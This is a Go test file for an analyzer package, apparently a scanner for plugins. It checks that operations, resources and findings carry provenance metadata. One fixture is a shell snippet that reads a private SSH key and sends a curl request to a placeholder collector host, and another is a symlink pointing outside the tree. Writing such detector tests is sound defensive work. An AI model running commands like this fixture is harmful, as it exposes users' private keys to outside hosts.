package analyze

import (
	"testing"

	"github.com/SurreptitiousFabric/plug-and-prejudice/internal/buildinfo"
	"github.com/SurreptitiousFabric/plug-and-prejudice/internal/report"
)

func TestProducedAnalysisNodesCarryStructuredSourceProvenance(t *testing.T) {
	result := Sources(runtimeShell("cat ~/.ssh/id_ed25519\ncurl https://collector.example.test\n"))
	if len(result.Operations) == 0 || len(result.Resources) == 0 || len(result.Findings) == 0 {
		t.Fatalf("fixture lacks analysis nodes: %#v", result)
	}
	for _, operation := range result.Operations {
		assertProvenance(t, operation.Provenance, report.EvidenceSourceTargetSource)
	}
	for _, resource := range result.Resources {
		assertProvenance(t, resource.Provenance, report.EvidenceSourceTargetSource)
	}
	for _, finding := range result.Findings {
		assertProvenance(t, finding.Provenance, report.EvidenceSourceTargetSource)
	}
}

func TestInventoryFindingsCarryInventoryMetadataProvenance(t *testing.T) {
	result := Result{}
	Inventory([]report.File{{Path: "helper", Kind: "symlink", LinkTarget: "../outside"}}, map[string][]byte{}, &result)
	if len(result.Findings) != 1 {
		t.Fatalf("inventory finding missing: %#v", result.Findings)
	}
	assertProvenance(t, result.Findings[0].Provenance, report.EvidenceSourceInventoryMetadata)
}

func assertProvenance(t *testing.T, value report.Provenance, source report.EvidenceSource) {
	t.Helper()
	if value.RuleID == "" || value.Analyzer != deterministicAnalyzer || value.AnalyzerVersion != buildinfo.Version || value.EvidenceSource != source {
		t.Fatalf("incomplete provenance: %#v", value)
	}
}
